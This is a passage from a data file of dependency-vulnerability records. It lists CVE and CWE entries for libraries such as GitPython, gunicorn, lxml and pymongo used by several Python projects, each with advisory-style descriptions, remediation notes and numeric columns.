- [GitHub Commit](https://github.com/gitpython-developers/GitPython/commit/75f4f63ab3856a552f06082aabf98845b5fa21e3)
",3,0
StackStorm_st2,gitpython,,True,CVE-2024-22190,CWE-426,2024-01-10,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.40及之前版本存在代码问题漏洞，该漏洞源于允许攻击者通过不受信任的搜索路径执行任意代码。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-40267,CWE-94,2023-08-11,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32之前版本存在安全漏洞，该漏洞源于没有阻止clone和clone_from中不安全的non-multi选项。",1,2
StackStorm_st2,gitpython,,True,CVE-2023-40590,CWE-426,2023-08-28,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在代码问题漏洞，该漏洞源于攻击者可以诱骗用户下载带有恶意git可执行文件的存储库，攻击者可以运行任何任意命令。",2,0
StackStorm_st2,gitpython,,True,CVE-2023-41040,CWE-22,2023-08-30,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython 3.1.32及之前版本存在路径遍历漏洞，该漏洞源于为了解析一些 git 引用，GitPython 从目录中读取文件.git，在某些情况，GitPython 不会检查该文件是否位于目录之外.git，导致攻击者可以让 GitPython 从系统中读取任何文件。",3,0
StackStorm_st2,gitpython,,True,CVE-2022-24439,CWE-20,2022-12-06,"GitPython是gitpython-developers开源的一个用于与 Git 存储库交互的 Python 库。
GitPython存在安全漏洞，该漏洞源于不正确的用户输入验证，攻击者利用该漏洞可以远程代码执行。",1,1
StackStorm_st2,cryptography,43.0.3,True,CVE-2024-12797,CWE-392,2025-02-11,<p>OpenSSL 是一个用于实现传输层安全（TLS）和安全套接层（SSL）协议的开源软件库，广泛应用于保护互联网通信。漏洞位于文件 ssl/statem/statem_clnt.c 中的函数 tls_post_process_server_rpk，此函数用于在 TLS 握手过程中处理和验证服务器的原始公钥（RPK）。由于在 tls_post_process_server_rpk 函数调用中未充分处理 ssl_verify_rpk 的返回值，导致在 RPK 验证失败的情况下未能及时终止连接，使未经验证的服务器能够继续完成握手过程。攻击者可以利用此缺陷进行中间人攻击，从而截取或篡改通信内容。</p>,3,0
StackStorm_st2,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50182,CWE-601,2025-06-19,<p>urllib3 是一个用于在 Python 中执行 HTTP 请求的流行库，并在 Pyodide 运行时中支持使用 JavaScript Fetch API 或回退使用 XMLHttpRequest。这意味着可以从浏览器或 Node.js 中使用 Python 库进行 HTTP 请求控制。然而，在 Pyodide 中，这些请求的重定向行为因 `retries` 和 `redirect` 参数被忽略而受到影响，由运行时自行决定重定向行为。</p>,3,2
StackStorm_st2,urllib3,2.2.3,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,eventlet,,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,oslo.utils,,True,CVE-2022-0718,CWE-522 CWE-532,2022-02-21,"Python-Oslo-Utils是OpenStack社区的一个库。用于提供对常见实用程序类型函数的支持，例如编码、异常处理、字符串操作和时间处理。
Python-Oslo-Utils 存在安全漏洞，目前暂无该漏洞信息，请随时关注CNNVD或厂商公告。",3,0
StackStorm_st2,oslo.utils,,True,CVE-2014-7231,CWE-200,2014-10-08,"OpenStack是美国国家航空航天局（National Aeronautics and Space Administration）和美国Rackspace公司合作研发的一个云平台管理项目。OpenStack oslo-incubator是Oslo（提供了一系列OpenStack Projects共享基础库的项目）的一部分；Cinder为其提供块存储服务功能；Nova是其中的一个用Python编写的云计算构造控制器，属于IaaS系统的一部分；Trove是其中的一个Database as a Service项目。
多款OpenStack产品中的‘strutils.mask_password’函数中存在安全漏洞，该漏洞源于程序记录命令时没有正确隐藏密码。本地攻击者可通过读取日志获取密码。以下产品和版本受到影响：OpenStack oslo-incubator；Cinder 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Nova 2013.2.3及之前版本，2014.1.1版本，2014.1.2版本；Trove 2013.2.3及之前版本，2014.1.1版本，2014.1",3,0
StackStorm_st2,pymongo,,True,,CWE-125,2024-05-31,,3,1
StackStorm_st2,pymongo,,True,CVE-2024-5629,CWE-125,2024-05-31,"PyMongo是MongoDB开源的一个官方 MongoDB Python 驱动程序。
PyMongo 4.6.2 版本及之前版本存在安全漏洞，该漏洞源于 bson 模块存在越界读取问题。",3,0
StackStorm_st2,pymongo,,True,CVE-2013-2132,CWE-400,2013-05-31,"MongoDB是美国MongoDB公司的一种面向文档的数据库管理系统。
MongoDB的mongo-python-driver2.5.2之前版本存在安全漏洞。攻击者利用该漏洞导致系统拒绝服务（空指针逆向引用造成程序崩溃）。",3,0
StackStorm_st2,pymongo,,True,CVE-2024-21506,CWE-125,2024-04-05,bson模块是一个用于处理 BSON 数据格式的库，BSON 是一种用于存储和网络传输的二进制编码的 JSON 格式。当精心构造的载荷强制解析器反序列化非托管内存时，会导致越界读取漏洞。解析器试图解释缓冲区旁边的字节，并抛出带有字符串的异常。如果下一个字节不是可打印的 UTF-8，解析器会抛出带有单个字节的异常。,2,2
StackStorm_st2,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
StackStorm_st2,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
StackStorm_st2,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
StackStorm_st2,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
StackStorm_st2,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
StackStorm_st2,eventlet,0.39.1,True,CVE-2025-58068,CWE-444,2025-08-29,"Eventlet是Python的一个并发网络库。
Eventlet 0.40.3之前版本存在环境问题漏洞，该漏洞源于HTTP请求夹带处理不当，可能导致前端安全控制绕过。",3,2
StackStorm_st2,psutil,,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
StackStorm_st2,psutil,,True,,CWE-362,2023-11-01,"## Overview
[psutil](https://github.com/giampaolo/psutil) is a cross-platform lib for process and system monitoring in Python

Affected versions of this package are vulnerable to Race Condition in the `files/threads/connections` process.
## Remediation
Upgrade `psutil` to version 0.5.1 or higher.
## References
- [GitHub Commit](https://github.com/giampaolo/psutil/commit/163f29d25f4c5d573fbd436e658829afe95bc1d9)
",3,0
tryton_tryton,defusedxml,,True,CVE-2013-1664,CWE-119,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在拒绝服务漏洞，该漏洞源于在扩展XML实体时存在错误。攻击者利用该漏洞通过特制的XML文档，消耗系统大量内存，并使系统崩溃或挂起。",3,2
tryton_tryton,defusedxml,,True,CVE-2013-1665,CWE-200,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在信息泄露漏洞，该漏洞源于在处理某些XML数据时存在错误。攻击者利用该漏洞通过特制的XML文档(包含外部实体引用)，可获得敏感信息。",3,2
tryton_tryton,defusedxml,,True,CVE-2013-1664,CWE-119,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在拒绝服务漏洞，该漏洞源于在扩展XML实体时存在错误。攻击者利用该漏洞通过特制的XML文档，消耗系统大量内存，并使系统崩溃或挂起。",3,2
tryton_tryton,defusedxml,,True,CVE-2013-1665,CWE-200,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在信息泄露漏洞，该漏洞源于在处理某些XML数据时存在错误。攻击者利用该漏洞通过特制的XML文档(包含外部实体引用)，可获得敏感信息。",3,2
tryton_tryton,lxml,>=2.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
tryton_tryton,lxml,>=2.0,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
tryton_tryton,lxml,>=2.0,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
tryton_tryton,lxml,>=2.0,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
tryton_tryton,lxml,>=2.0,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
tryton_tryton,lxml,>=2.0,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
tryton_tryton,lxml,>=2.0,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
tryton_tryton,lxml,>=2.0,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
tryton_tryton,async,2.6.4,False,CVE-2024-39249,CWE-1333,2024-07-01,"Async是英国Caolan McMahon个人开发者的一个实用模块。用于使用异步 JavaScript。
Async 2.6.4及之前版本和3.2.5及之前版本存在安全漏洞，该漏洞源于在解析自动注入函数中的函数时容易受到正则表达式拒绝服务（ReDoS）攻击。",3,2
tryton_trytond,defusedxml,,True,CVE-2013-1664,CWE-119,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在拒绝服务漏洞，该漏洞源于在扩展XML实体时存在错误。攻击者利用该漏洞通过特制的XML文档，消耗系统大量内存，并使系统崩溃或挂起。",3,2
tryton_trytond,defusedxml,,True,CVE-2013-1665,CWE-200,2013-01-16,"OpenStack是由Rackspace和NASA共同开发的云计算平台，帮助服务商和企业内部实现类似于Amazon EC2和S3的云基础架构。
多款OpenStack产品中存在信息泄露漏洞，该漏洞源于在处理某些XML数据时存在错误。攻击者利用该漏洞通过特制的XML文档(包含外部实体引用)，可获得敏感信息。",3,2
tryton_trytond,lxml,>=2.0,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
tryton_trytond,lxml,>=2.0,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
tryton_trytond,lxml,>=2.0,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
tryton_trytond,lxml,>=2.0,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
tryton_trytond,lxml,>=2.0,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
tryton_trytond,lxml,>=2.0,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
tryton_trytond,lxml,>=2.0,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
tryton_trytond,lxml,>=2.0,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
vyperlang_vyper,wheel,,True,CVE-2022-40898,CWE-20,2022-12-22,"Python是Python基金会的一套开源的、面向对象的程序设计语言。该语言具有可扩展、支持模块和包、支持多种平台等特点。
Python Packaging Authority (PyPA) Wheel 0.37.1版本及之前版本存在安全漏洞。攻击者利用该漏洞通过控制Wheel cli输入导致拒绝服务。",2,2
web2py_web2py,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
web2py_web2py,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
web2py_web2py,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
web2py_web2py,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
web2py_web2py,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
web2py_web2py,gunicorn,,True,,CWE-20,2021-04-02,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to Improper Input Validation. Gunicorn fails with a 500, instead of a 400, when a request path is a malformed IPv6 address. This is due to no raise 'InvalidRequestLine' exception when the line contains malicious data.
## Remediation
Upgrade `gunicorn` to version 19.4.0 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/b951175c66c353d10127a20a62f61e834829856c)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/1023)
",4,0
web2py_web2py,gunicorn,,True,,CWE-444,2020-01-09,"## Overview
[gunicorn](http://gunicorn.org/) is a Python WSGI HTTP Server for UNIX

Affected versions of this package are vulnerable to HTTP Request Smuggling. It fails to properly process the `Transfer-Encoding` and `Content-Length` headers when both are present in a package request. This allows for conflicting information to be sent regarding the length of the package, which when processed by back-end servers under certain configurations would allow for malicious users to bypass security controls, gain unauthorized access to sensitive data, and directly compromise other application users.
## Remediation
Upgrade `gunicorn` to version 19.10.0, 20.0.1 or higher.
## References
- [GitHub Commit](https://github.com/benoitc/gunicorn/commit/c5be1bae5c42b1e600be22d0655fc3ec4e4711cb)
- [GitHub Issue](https://github.com/benoitc/gunicorn/issues/2176)
- [GitHub PR](https://github.com/benoitc/gunicorn/pull/2181)
- [Gunicorn ChangeLog](https://docs.gunicorn.org/en/stable/news.html#id1)
- [HTTP Request Smuggling Security Blog](https://portswigger.net/web-security/request-smuggling)
",3,0
web2py_web2py,gunicorn,,True,CVE-2018-1000164,CWE-93,2018-04-18,"gunicorn是一款基于UNIX平台的Python WSGI HTTP服务器软件。

gunicorn 19.4.5版本中的nicorn/http/wsgi.py文件的‘process_headers’函数存在安全漏洞。攻击者可利用该漏洞造成服务器返回任意的HTTP包头。",2,2
web2py_web2py,gunicorn,,True,CVE-2024-1135,CWE-444,,Gunicorn是一个开源的Python WSGI HTTP服务器，旨在处理网络请求并提供高性能的Web服务。该组件存在HTTP请求走私漏洞，原因在于对`Transfer-Encoding`标头的验证不当，攻击者可以通过构造包含相互冲突的`Transfer-Encoding`标头的请求，从而绕过安全限制，访问受限的端点。此漏洞的触发条件是用户的网络路径未能过滤无效请求。,2,1
web2py_web2py,gunicorn,,True,CVE-2024-6827,CWE-444,,Gunicorn是一个开源的Python Web服务器网关接口（WSGI）HTTP服务器。Gunicorn版本21.2.0未能正确验证'Transfer-Encoding'头的值，导致在RFC标准中规定的默认回退方法为'Content-Length'，使其易受TE.CL请求夹带攻击。攻击者可以通过构造特定的HTTP请求来利用此漏洞，造成缓存中毒、数据泄露、会话操纵、SSRF、XSS、DoS、数据完整性损害、安全绕过、信息泄漏和业务逻辑滥用等问题。,2,1
zopefoundation_Zope,Sphinx,,True,CVE-2020-11022,CWE-79,2020-04-29,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.2版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
zopefoundation_Zope,Sphinx,,True,CVE-2020-11023,CWE-79,2020-04-13,"jQuery是美国John Resig个人开发者的一套开源、跨浏览器的JavaScript库。该库简化了HTML与JavaScript之间的操作，并具有模块化、插件扩展等特点。
jQuery 1.0.3版本至3.5.0之前版本中存在跨站脚本漏洞。该漏洞源于WEB应用缺少对客户端数据的正确验证。攻击者可利用该漏洞执行客户端代码。",3,1
zopefoundation_Zope,Sphinx,,True,,CWE-1333,2023-08-01,"## Overview

Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression in the function `load_v2` of `inventory.py`.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its original and legitimate users. There are many types of DoS attacks, ranging from trying to clog the network pipes to the system by generating a large volume of traffic from many machines (a Distributed Denial of Service - DDoS - attack) to sending crafted requests that cause a system to crash or take a disproportional amount of time to process.

The Regular expression Denial of Service (ReDoS) is a type of Denial of Service attack. Regular expressions are incredibly powerful, but they aren't very intuitive and can ultimately end up making it easy for attackers to take your site down.

Let’s take the following regular expression as an example:
```js
regex = /A(B|C+)+D/
```

This regular expression accomplishes the following:
- `A` The string must start with the letter 'A'
- `(B|C+)+` The string must then follow the letter A with either the letter 'B' or some number of occurrences of the letter 'C' (the `+` matches one or more times). The `+` at the end of this section states that we can look for one or more matches of this section.
- `D` Finally, we ensure this section of the string ends with a 'D'

